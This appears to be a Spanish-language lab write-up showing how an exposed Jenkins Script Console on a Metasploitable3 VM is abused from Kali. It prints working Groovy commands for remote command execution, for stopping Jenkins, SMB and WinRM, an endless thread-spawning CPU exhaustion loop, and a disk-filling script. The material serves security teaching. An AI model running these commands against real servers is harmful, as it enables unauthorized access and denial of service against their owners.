---
title: "Lab 03 - Kill Chain 2"
date: 2026-06-15 00:12:00
categories: [lab, setup]
tags: [metasploitable, virtualbox, kali, kill Chain, Jenkins]
---

# 1 VERIFICAR QUE JENKINS ESTA ACTIVO EN METASPLOITABLE3
Para realizar esta tarea tenemos 2 opciones:
* Hacerlo desde Kali.
* Hacerlo desde Metasploitable3

## Opción A (desde Kali)
Para realizar este paso ejecutamos el siguiente comando:

```
curl -s -o /dev/null -w "%{http_code}" http://10.0.2.3:8484/
```

Debemos tener como respuesta: 200

![RESPUESTA DE OPCION A](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781500894/opcion_a_rbp2rr.png)

## Opción B (desde Metasploitable3)
Para realizarlo por esta opción primero debemos conectarnos vía SSH

```
ssh vagrant@10.0.2.3
```

Luego dentro del PowerShell

```
netstat -ano | findstr :8484
```

Obteniendo que Jenkins y puerto 8484 en LISTENING

![RESPUESTA DE OPCION B](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781501354/opcion_b_qygqn0.png)

# 2 ACCEDER A JENKINS SCRIPT CONSOLE

En el navegador del kali ponemos lo siguiente:

```
http://10.0.2.3:8484/script
```

Obteniendo este resultado

![INGRESO A JENKINGS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781503997/ingreso_a_jenkins_kkmfts.png)

# 3 EJECUTAR COMANDOS GROOVY

En el campo de "Scrip", escribimos el siguiente comando

```
println "cmd /c whoami".execute().text

def cmd = "cmd /c ipconfig"
def proc = cmd.execute()
proc.waitFor()
println proc.text

println "cmd /c netstat -an | findstr 10.0.2.10".execute().text
```

Obteniendo como respuesta lo siguiente

![RESPUESTA DE JENKINS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781504976/resultado_jenkins_ct1uyn.png)

# 4 COMANDOS DOS

### Primer paso, detendremos Jenkins, usando el siguiente comando

```
"cmd /c net stop jenkins".execute()
```

Resultando

![DETENER JENKINS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781576698/detener_jenkins_umz50k.png)

### Segundo paso, detenemos los servicios criticos de windows:

```
// Detener el servidor de archivos SMB
"cmd /c net stop lanmanserver".execute()

// Detener el servicio de acceso remoto WinRM
"cmd /c net stop winrm".execute()
```

Con este paso realizado se tiene este impacto en caso sea una maquina real en un entorno real:

* Se caen los archivos compartidos en red.
* Las impresoras compartidas dejan de funcionar.
* Otras maquinas no pueden acceder a recursos de esta VM.
* Servicios que dependen de SMB (como ciertos backups) fallan.
* Se bloquea la administración remota vía PowerShell.
* Herramientas como Ansible, Chef, Puppet (que usan WinRM) pierden conexión.
* Los administradores no pueden ejecutar comandos remotos en la máquina.

![EJECUCIÓN DE COMANDOS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781602328/ejecutando_nihbhh.png)

### Tercer paso, agotar CPU (for bomb en Groovy)

```
while (true) {
    Thread.start { while (true) {} }
}
```

![AGOTAMOS LA MAQUINA VICTIMA](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781602676/agotar_CPU_llc3gp.png)

Este comando lanza hilos infinitos que consumen el CPU victima sin parar.
Con ello se tiene el siguiente impacto:

* CPU al 100% en pocos segundos.
* El sistema se congela (mouse/Keyboard no responden).
* Otros procesos dejan de funcionar por falta de recursos.
* La VM se vuelve inutilizable hasta reiniciar.

### Cuarto paso, llenar el disco duro con basura

```
def f = new File("C:\\Windows\\Temp\\bomb.txt")
def writer = f.newWriter()
(1..500000).each { writer.writeLine("A" * 1000) }
writer.close()
println "Escrito: ${f.length() / 1024 / 1024} MB"
```

![LLENAMOS EL DISCO DURO](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781603195/LLENAMOS_EL_DISCO_DURO_nyrut7.png)

con este comando hacemos que se escriba 500000 lineas de 1000 caracteres "A" en un archivo de 476 MB.
El impacto seria:
* Ocupa espacio en disco rapidamente.
* Si el numero aumenta de 500000 a mas se puede llenar el disco duro.
* Cuando el disco duro este lleno:
  - Windows no puede crear archivos temporales.
  - Los servicios fallan.
  - El sistema se vuelve inestable.

![RENDIMIENTO DE VM](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781603705/Rendimiento_de_VM_x3de9e.png)

En conclusión, este Laboratorio desmuestra que la Script COnsole de Jenkins no es solo un problema de confidencialidad (robo de datos), sino tambien de disponibilidad. Un atacante puede destruir el servicio con solo poner unos códigos.





